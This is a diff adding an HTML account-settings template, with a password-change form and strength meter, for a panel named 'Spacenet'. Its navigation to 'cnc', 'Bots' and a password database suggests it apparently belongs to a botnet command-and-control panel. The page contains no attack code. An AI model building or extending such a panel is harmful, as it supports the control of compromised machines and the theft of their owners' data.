@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset='utf-8'>
+<meta http-equiv="X-UA-Compatible" content="chrome=1">
+<title>Spacenet | Account</title>
+<link rel="icon" 
+type="image/png" 
+href="/static/images/icon.png">
+<link rel="stylesheet" type="text/css" href="../static/css/styles.css">	
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js" type="text/javascript"></script>
+</head>
+<body>
+
+<div class="cp_container">
+	
+<ul class="cp_ul">
+  <li class="cp_li"><a href="#" style="all:unset;"><img src="/static/images/logo_spn.png" alt="logo" class="cp_logo"></a></li>
+  <li class="cp_li" style="float:right"><a href="../disconnect">Logout</a></li>
+</ul>
+	
+<ul class="cp_ul1">
+  <li class="cp_li1"><a href="/cnc">Overview</a></li>
+  <li class="cp_li1"><a href="list">Bots</a></li>
+  <li class="cp_li1"><a href="ossummary">Os</a></li>
+  <li class="cp_li1"><a href="dbpass">Database</a></li>
+  <li class="cp_li1"><a class="active" href="#">Account</a></li>
+</ul>
+	
+<div class="cp_body">
+	<p class="cp_title">Account</p>
+	<hr>
+	
+	
+	
+	<table class="profile_table">
+		<tr>
+			<td style="text-align:left">
+				<img src="/static/images/icon_player_hacker.png" id="admin-icon" class="profile_img">
+			</td>
+		
+			<th style="text-align:left">
+				Account :<br>
+				Last Connection : <br>
+				Ip last connection : <br>
+				Position last connection : <br>
+			</th>
+			<th style="text-align:left">
+				<span style="color:#4a7dce;">Admin</span><br>
+				{{time}}<br>
+				{{ip}}<br>
+				{{geo}}<br>
+			</th>
+		</tr>
+		<tr>
+		<td style="text-align:left;color:white;">
+			---
+		</td>
+		</tr>
+			
+		<tr>
+			<td style="text-align:left">
+			</td>
+			<th style="text-align:left; background-color: #dddddd;">
+				Change Password 
+			</th>
+			<th style="text-align:left; background-color: #dddddd;">
+				 
+			</th>
+		</tr>
+		<tr>
+		<td style="text-align:left;color:white;">
+			---
+		</td>
+		</tr>
+
+		<tr>	
+			<td style="text-align:left">
+			</td>
+			<th style="text-align:left">
+				New password : 
+			</th>
+			<th style="text-align:left">
+				<input type="password" name="password" id="password1" class="cp_input">	
+				<meter max="4" id="password-strength-meter"></meter>
+			</th>
+			<th>	
+			</th>
+		</tr>
+		<tr>
+			<td style="text-align:left;margin-top:5px;">
+			</td>
+			<th style="text-align:left">
+				Confirm password :
+			</th>
+			<th style="text-align:left">
+				 <input  type="password" id="password2" class="cp_input" onkeypress="keypressed(event)">
+			</th>
+	    </tr>
+		<tr>
+			<td style="text-align:left">
+			</td>
+			<th style="text-align:left;">
+			</th>
+			<th><br>
+				<button type="submit" onclick="send_command()" class="profile_button">Create Password</button> 
+			</th>
+		</tr>
+
+	</table>
+	
+	
+</div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zxcvbn/4.2.0/zxcvbn.js"></script>
+<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>	
+<script>
+var strength = {
+	0: "Worst ☹",
+	1: "Bad ☹",
+	2: "Weak ☹",
+	3: "Good ☺",
+	4: "Strong ☻"
+}
+
+var password = document.getElementById('password1');
+var meter = document.getElementById('password-strength-meter');
+var text = document.getElementById('password-strength-text');
+
+password.addEventListener('input', function()
+{
+    var val = password.value;
+    var result = zxcvbn(val);
+    
+    // Update the password strength meter
+    meter.value = result.score;
+   
+    // Update the text indicator
+    if(val !== "") {
+		
+        text.innerHTML = "Strength: " + "<strong>" + strength[result.score]; 
+    }
+    else {
+        text.innerHTML = "";
+    }
+});
+	
+function keypressed(e){
+	if(e.keyCode === 13){
+	send_command();
+	}
+	return false;
+}
+function send_command(e) {
+	var x;
+    x = document.getElementById("password1").value;
+    if (x == "") {
+        alert("Password field empty");
+        return false;
+    };
+	
+	if (document.getElementById("password1").value == document.getElementById("password2").value) {
+	 $.post("../api/passupdate_setting", {'password': $('#password1').val()});
+	window.location = 'passset';
+	}
+	else {
+	alert("Passwords do not match");
+	return false;
+	}
+	
+}
+
+</script>
+
+</body>	
+
+
+
+</html>
